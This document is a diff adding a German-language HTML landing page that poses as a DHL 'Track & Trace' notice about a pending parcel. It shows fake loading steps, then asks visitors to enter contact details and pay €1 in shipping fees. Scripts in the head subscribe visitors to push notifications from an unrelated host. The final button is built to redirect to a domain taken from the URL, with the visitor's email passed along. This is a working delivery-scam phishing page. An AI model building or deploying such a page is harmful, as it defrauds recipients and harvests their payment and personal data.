@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <title>Track &amp; Trace</title>
+    <meta name="description" content="">
+    <meta name="author" content="front-man.com">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=yes">
+
+    <!-- Prefetch DNS for external assets (Twitter widgets etc). -->
+    <link rel="dns-prefetch" href="https://ajax.googleapis.com/">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com/">
+    <link rel="dns-prefetch" href="https://themes.googleusercontent.com/">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com/">
+
+    <!-- Chrome Android color -->
+    <meta name="theme-color" content="#fff">
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600,700" rel="stylesheet">
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="css/styles.css">
+
+    <!-- Modernizr -->
+    <script src="js/lib/modernizr.js"></script>
+
+<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js"></script>
+<script src="https://api.mdsyzz.com/auto-push.min.js"></script>
+<script>
+InitializePush("7ca0b0bb-3fe4-4cc4-97c0-1807bcbc817a");
+</script>
+
+   <!-- Script -->
+    <script>
+        //script to stop tracking fucking up
+
+        //strip out shit charecters
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || '');
+        }
+        // Grab dom URL variable
+        var dom = getURLParameter('dom');
+        var email = getURLParameter('email');
+        var emaildec = decodeURI(email);
+        var realemail = email.replace("%40", "@");
+
+        var link = "https://" + dom + "/click/1";
+    </script>
+
+
+
+
+
+
+</head>
+
+<body>
+	<div class="page">
+		<!-- HEADER -->
+		<header class="header">
+			<img src="images/logo.svg" alt="Icon" class="header__icon">
+			<h1 class="header__title">
+				<strong>Track &amp; Trace</strong>
+				<small>Internationale Lieferung</small>
+			</h1>
+		</header>
+		<!-- / HEADER -->
+
+
+		<!-- Screen 1 -->
+		<main class="main main--1">
+			<div class="card">
+				<h2 class="title">AUSSTEHENDES LIEFERPAKET </h2>
+				<span class="badge" data-badge="!"><img src="images/icon-box.svg" alt=""></span>
+				<p>
+					Es steht (1) Paket f&uuml;r Lieferung aus. Verwenden Sie Ihren Code, um ihn zu verfolgen und zu bekommen
+				</p>
+
+				<hr>
+
+				<dl class="tracking-code">
+					<dt>Ihr Tracking-Code</dt>
+					<dd>Ih8kU92DE</dd>
+				</dl>
+			</div>
+
+			<button type="button" class="btn screen-trigger--1">Verfolgen Sie Ihre Bestellung</button>
+		</main>
+
+		<!-- Screen 2 -->
+		<main class="main main--2">
+			<div class="card">
+				<div class="spinner"></div>
+
+				<svg role="img" class="main__icon icon icon-check"><use xlink:href="icons/icons.svg#icon-check"></use></svg>
+
+				<ul class="loading-list">
+					<li>Wir suchen Ihren Paket...</li>
+					<li>Wir suchen Ihr Tracking-Code...</li>
+					<li>Wir suchen die Lieferm&ouml;glichkeiten...</li>
+				</ul>
+			</div>
+		</main>
+
+		<!-- Screen 3 -->
+		<main class="main main--3"">
+			<ol class="steps-wrap">
+				<li class="step step--current"></li>
+				<li class="step"></li>
+				<li class="step"></li>
+			</ol>
+			<div class="card">
+				<div class="product">
+					<img src="images/icon-box.svg" alt="">
+					<div class="product__content">
+						<h3 class="subtitle">Paketinformationen:</h3>
+
+						<dl class="product__info">
+							<dt>Status:</dt>
+							<dd>Lieferungsbereit</dd>
+						</dl>
+						<dl class="product__info">
+							<dt>Versand &uuml;ber:</dt>
+							<dd>DHL</dd>
+						</dl>
+						<dl class="product__info">
+							<dt>Paketgewicht:</dt>
+							<dd>0,6 kg</dd>
+						</dl>
+						<dl class="product__info">
+							<dt>Versandkosten:</dt>
+							<dd>€1</dd>
+						</dl>
+					</div>
+				</div>
+			</div>
+
+			<button type="button" class="btn screen-trigger--2">Lieferung jetzt planen</button>
+		</main>
+
+		<!-- Screen 4 -->
+		<main class="main main--4">
+			<ol class="steps-wrap">
+				<li class="step step--done"></li>
+				<li class="step step--current"></li>
+				<li class="step"></li>
+			</ol>
+
+			<div class="card">
+				<img src="images/icon-box.svg" alt="">
+
+				<form class="questions-wrap">
+					<div class="question question--1">
+						<h2 class="subtitle">Wie m&ouml;chten Sie Ihre Bestellung erhalten?</h2>
+
+						<div class="question__answers">
+							<input type="radio" id="question01a" name="question01">
+							<label for="question01a">
+								<svg role="img" class="icon icon-truck"><use xlink:href="icons/icons.svg#icon-truck"></use></svg>
+								<span>Ich m&ouml;chte, dass es geliefert wird</span>
+							</label>
+
+							<input type="radio" id="question01b" name="question01" disabled>
+							<label for="question01b" data-error="Paket ist bereits im Depot">
+								<svg role="img" class="icon icon-store"><use xlink:href="icons/icons.svg#icon-store"></use></svg>
+								<span>Ich m&ouml;chte es abholen</span>
+							</label>
+						</div>
+					</div>
+
+					<div class="question question--2">
+						<h2 class="subtitle">Wohin m&ouml;chten Sie es geliefert?</h2>
+
+						<div class="question__answers">
+							<input type="radio" id="question02a" name="question02">
+							<label for="question02a">
+								<svg role="img" class="icon icon-home"><use xlink:href="icons/icons.svg#icon-home"></use></svg>
+								<span>Nach Hause</span>
+							</label>
+
+							<input type="radio" id="question02b" name="question02">
+							<label for="question02b">
+								<svg role="img" class="icon icon-briefcase"><use xlink:href="icons/icons.svg#icon-briefcase"></use></svg>
+								<span>Nach Arbeit</span>
+							</label>
+						</div>
+					</div>
+
+					<div class="question question--3">
+						<h2 class="subtitle">Wann m&ouml;chten Sie es geliefert?</h2>
+
+						<div class="question__answers">
+							<input type="radio" id="question03a" name="question03">
+							<label for="question03a">
+								<svg role="img" class="icon icon-calendar"><use xlink:href="icons/icons.svg#icon-calendar"></use></svg>
+								<span>Wochentage</span>
+							</label>
+
+							<input type="radio" id="question03b" name="question03">
+							<label for="question03b">
+								<svg role="img" class="icon icon-calendar"><use xlink:href="icons/icons.svg#icon-calendar"></use></svg>
+								<span>Wochenende</span>
+							</label>
+						</div>
+					</div>
+				</form>
+			</div>
+		</main>
+
+		<!-- Screen 5 -->
+		<main class="main main--5">
+			<ol class="steps-wrap">
+				<li class="step step--done"></li>
+				<li class="step step--current"></li>
+				<li class="step"></li>
+			</ol>
+
+			<div class="card">
+				<div class="spinner"></div>
+
+				<svg role="img" class="main__icon icon icon-check"><use xlink:href="icons/icons.svg#icon-check"></use></svg>
+
+				<ul class="loading-list">
+					<li>Speichern Sie Ihre Einstellungen...</li>
+					<li>Ihr Paket wird best&auml;tigt...</li>
+					<li>Das Paket ist reserviert!</li>
+				</ul>
+			</div>
+		</main>
+
+		<!-- Screen 6 -->
+		<main class="main main--6">
+			<ol class="steps-wrap">
+				<li class="step step--done"></li>
+				<li class="step step--done"></li>
+				<li class="step step--current"></li>
+			</ol>
+			<div class="card">
+				<h2 class="title title--primary">BESTELLBEST&Auml;TIGUNG</h2>
+				<img src="images/icon-box.svg" alt="" class="spaced1">
+
+				<h3 class="subtitle">Erwarteter Lieferzeitpunkt: <br>3 Tage mit DHL</h3>
+
+				<p>
+					*Geben Sie Ihre Kontaktinformationen auf der n&auml;chsten Seite ein und zahlen Sie €1 f&uuml;r die Versandkosten
+				</p>
+			</div>
+
+			<script>document.write('<a href="'+ link + '" class="btn">Geben Sie die Versandinformationen ein</a>');</script>
+		</main>
+
+		<div class="foot">
+			<h4 class="foot__title">Entwickelt von:</h4>
+			<div class="foot__icons">
+				<img src="images/foot-icon01.svg" alt="">
+				<img src="images/foot-icon02.svg" alt="">
+				<img src="images/foot-icon03.svg" alt="">
+			</div>
+		</div>
+	</div>
+
+	<script src="js/lib/jquery-3.3.1.min.js"></script>
+	<script src="js/svg4everybody.min.js"></script>
+
+	<script src="js/init.js"></script>
+
+</body>
+
+
+</html>
+<!-- Localized -->
